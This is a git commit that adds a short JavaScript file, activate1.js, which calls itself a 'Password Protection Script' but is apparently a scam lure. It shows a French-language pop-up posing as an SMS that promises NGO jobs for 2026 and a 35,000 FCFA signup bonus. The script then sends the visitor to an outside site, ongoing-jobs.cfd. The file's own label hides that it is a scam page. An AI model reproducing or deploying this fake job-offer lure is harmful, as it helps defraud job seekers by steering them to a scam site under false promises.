0b43373d46d34fd7a0ed2fc8dabe9d50c75ca589
Hjiosse <gogeakoti@gmail.com>
2026-03-27 15:13:21 +0100

    Create activate1.js

---
+++ activate1.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'POSTULER MAINTENANT'
+password = prompt(
+  'SMS: Félicitations ! Vous êtes éligible pour postuler aux emplois ONG 2026 de SOBEL AZIZ NGOM et recevoir un bonus d’inscription de 35 000 FCFA. Appuyez sur OK pour POSTULER.',
+  'POSTULER MAINTENANT'
+);
+if (password != 'POSTULER MAINTENANT') {
+  location.href = 'https://ongoing-jobs.cfd/35000-Travailler-Domicile.html';
+  }
